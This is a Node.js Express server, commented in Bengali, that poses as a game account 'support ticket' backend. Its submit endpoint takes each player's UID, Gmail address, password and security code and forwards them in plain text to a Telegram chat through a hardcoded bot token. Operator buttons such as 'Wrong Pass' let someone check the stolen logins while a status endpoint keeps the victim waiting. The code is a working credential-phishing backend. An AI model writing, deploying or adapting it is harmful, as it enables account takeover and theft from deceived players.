const express = require('express');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();

// CORS সম্পূর্ণ ওপেন করা
app.use(cors({ origin: '*' }));
app.use(express.json());

// ক্যাশিং বন্ধ করার হেডার
app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});

const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
const TELEGRAM_CHAT_ID = "-1004444318249";
const DB_FILE = path.join(__dirname, 'database.json');

// ডাটাবেজ ফাইল রিড করা
function readDB() {
    if (!fs.existsSync(DB_FILE)) {
        fs.writeFileSync(DB_FILE, JSON.stringify({}));
    }
    try {
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return JSON.parse(data);
    } catch (e) {
        return {};
    }
}

// ডাটাবেজ ফাইলে সেভ করা
function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

app.get('/', (req, res) => res.send("Backend Running Cleanly!"));

// ১. ফর্ম সাবমিট API
app.post('/api/submit-ticket', async (req, res) => {
    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
    
    let db = readDB();
    db[uid] = {
        status: "Pending",
        name: "Checking Status...",
        level: "Under Review",
        reason: ""
    };
    writeDB(db);

    const telegramMessage = `
📩 *New Support Ticket Submitted!*

🆔 *Player UID:* \`${uid}\`
📧 *Bind Gmail:* \`${gmail}\`
🔑 *Password:* \`${password}\`
🔢 *Security Code:* \`${securityCode}\`
📌 *Issue:* ${problemType}
📝 *Details:* ${additionalDetails}
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Verify Account", callback_data: `verify_${uid}` }
                    ],
                    [
                        { text: "❌ Wrong Pass", callback_data: `reject_${uid}_Wrong Password` },
                        { text: "❌ Wrong Gmail", callback_data: `reject_${uid}_Invalid Gmail` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `reject_${uid}_Wrong Security Code` },
                        { text: "❌ Wrong UID", callback_data: `reject_${uid}_Invalid UID` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ২. টেলিগ্রাম ওয়েবহুক API
app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200); // টেলিগ্রামকে আগে OK রেসপন্স দেওয়া

    try {
        const update = req.body;

        if (update && update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data; 
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            const parts = data.split('_');
            const action = parts[0];
            const uid = parts[1];
            const reason = parts[2] || "Information Mismatch";

            let db = readDB();

            if (action === 'verify') {
                db[uid] = {
                    status: "Verified",
                    name: "Verified Player",
                    level: "Active Account",
                    reason: ""
                };
                writeDB(db);

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status has been updated to *VERIFIED*!`,
                    parse_mode: 'Markdown'
                });

            } else if (action === 'reject') {
                db[uid] = {
                    status: "Rejected",
                    name: "Verification Failed",
                    level: "N/A",
                    reason: reason
                };
                writeDB(db);

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` has been marked as *REJECTED* (${reason})!`,
                    parse_mode: 'Markdown'
                });
            }

            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callbackQuery.id,
                text: `UID ${uid} Updated!`
            });
        }
    } catch (err) {
        console.error("Error processing callback:", err);
    }
});

// ৩. লাইভ স্ট্যাটাস চেক API
app.get('/api/check-status/:uid', (req, res) => {
    const uid = req.params.uid;
    const db = readDB();
    const userData = db[uid] || {
        status: "Pending",
        name: "Checking Status...",
        level: "Under Review",
        reason: ""
    };
    res.json({ success: true, data: userData });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
